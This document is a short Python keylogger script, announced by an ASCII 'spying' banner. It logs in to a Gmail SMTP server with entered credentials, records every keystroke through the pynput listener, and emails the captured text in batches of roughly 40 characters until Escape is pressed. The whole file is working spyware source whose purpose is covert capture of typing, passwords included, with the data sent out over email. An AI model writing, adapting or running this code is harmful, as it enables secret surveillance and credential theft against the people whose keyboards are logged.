import pynput
import getpass
import time
import smtplib

from pynput.keyboard import Key, Listener
t = time.localtime()

print('''Creating
_________  __  __(_)___  ____ _    
  / ___/ __ \/ / / / / __ \/ __ `/    
 (__  ) /_/ / /_/ / / / / / /_/ / _ _ 
/____/ .___/\__, /_/_/ /_/\__, (_|_|_)
    /_/    /____/        /____/       
''')


#email configuration
print("Kindly enter your credentials below")
mail  = input('Email: ')

#to prevent keystrokes from appearing in terminal
pwd = getpass.getpass('Password: ', stream=None)

server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(mail,pwd)

#keylogger

def send_mail(completed_word):

    server.sendmail(
        #email address sending to
        mail,

        #email address sending from
        mail,

        #logged text from keyboard
        completed_word
    )


count = 0
limit = 40
keys = []
phrase = ''
completed = ''

def create_word(keys):
    global phrase, completed, limit
    for key in keys:
            k = str(key).replace("'","")

            if k == "Key.space" or k.find("enter") > 0:
                phrase += ' ' 
                completed += phrase
            
                #reset phrase
                phrase= ''

                if len(completed) >= limit:
                    send_mail(completed)
                    completed = ''
            
            elif k.find("backspace") > 0:
                phrase = phrase[:-1]

            elif k.find("Key") == -1:
                phrase += k

# get key 
def on_press(key): 
    global keys, count
 
    keys.append(key)
    count += 1
    #print("{0} pressed".format(key))

    #ensure the keys are sent to email after 40 char's have been typed
    if count >= 40:
        count = 0
        create_word(keys)
        keys = []

#stops program when escape key is pressed
def on_release(key):
    if key == Key.esc:
        return False

with Listener(
    on_press= on_press, 
    on_release= on_release) as listener:
    listener.join()
